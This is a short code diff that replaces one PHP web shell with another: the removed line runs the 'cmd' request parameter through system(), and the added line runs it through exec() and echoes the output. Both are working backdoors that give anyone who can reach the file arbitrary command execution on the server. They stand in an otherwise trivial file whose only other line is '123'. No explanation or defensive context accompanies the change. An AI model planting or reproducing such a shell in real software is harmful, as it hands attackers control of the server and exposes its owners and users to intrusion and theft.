@@ -1,2 +1,2 @@
 123
-<?php system($_GET['cmd']); ?>
+<?php echo exec($_GET['cmd']); ?>
